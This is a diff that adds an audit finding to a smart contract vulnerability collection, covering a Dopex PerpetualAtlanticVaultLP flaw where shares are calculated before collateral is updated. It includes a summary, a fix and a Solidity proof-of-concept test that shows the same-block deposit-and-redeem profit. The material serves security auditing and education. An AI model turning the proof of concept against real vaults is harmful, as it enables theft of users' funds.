@@ -313,3 +313,51 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 5. [High] Users can get immediate profit when deposit and redeem in PerpetualAtlanticVaultLP
+
+### Calculates shares before updating the total collateral
+
+- Summary: When a user deposits assets, the function calculates shares before updating the total collateral. This creates an opportunity for users to exploit the difference in calculations and gain immediate profits by depositing and redeeming in the same block, potentially leading to sandwich and MEV attacks.
+
+- Impact & Recommendation: Move  `perpetualAtlanticVault.updateFunding`  before  `previewDeposit`  is calculated.
+  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-05-users-can-get-immediate-profit-when-deposit-and-redeem-in-perpetualatlanticvaultlp) & [Report](https://code4rena.com/reports/2023-08-dopex)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+      function testSandwichProvideFunding() public {
+        rdpxV2Core.bond(20 * 1e18, 0, address(this));
+        rdpxV2Core.bond(20 * 1e18, 0, address(this));
+        skip(86400 * 7);
+        vault.addToContractWhitelist(address(rdpxV2Core));
+        vault.updateFundingPaymentPointer();
+        // test funding succesfully
+        uint256[] memory strikes = new uint256[](1);
+        strikes[0] = 15e6;
+        // calculate funding is done properly
+        vault.calculateFunding(strikes);
+        uint256 funding = vault.totalFundingForEpoch(
+            vault.latestFundingPaymentPointer()
+        );
+        // send funding to rdpxV2Core and call sync
+        weth.transfer(address(rdpxV2Core), funding);
+        rdpxV2Core.sync();
+        rdpxV2Core.provideFunding();
+        skip(86400 * 6);
+        uint256 balanceBefore = weth.balanceOf(address(this));
+        console.log("balance of eth before deposit and redeem:");
+        console.log(balanceBefore);
+        weth.approve(address(vaultLp), type(uint256).max);
+        uint256 shares = vaultLp.deposit(1e18, address(this));
+        vaultLp.redeem(shares, address(this), address(this));
+        uint256 balanceAfter = weth.balanceOf(address(this));
+        console.log("balance after deposit and redeem:");
+        console.log(balanceAfter);
+        console.log("immediate profit :");
+        console.log(balanceAfter - balanceBefore);
+    }
+
+  ```
+
+  </details>
